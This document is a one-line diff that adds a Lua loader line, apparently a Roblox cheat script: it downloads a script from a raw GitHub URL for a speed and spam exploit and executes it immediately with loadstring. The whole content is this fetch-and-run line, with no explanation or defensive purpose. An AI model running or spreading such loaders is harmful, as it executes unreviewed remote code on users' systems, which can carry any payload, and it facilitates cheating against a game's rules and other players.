@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/vortexorbimagine/loaders/main/loaders/x100-1-speed-keyboard-escape-candy-choco-spam5-qs4ijelagsiosv.lua"))()
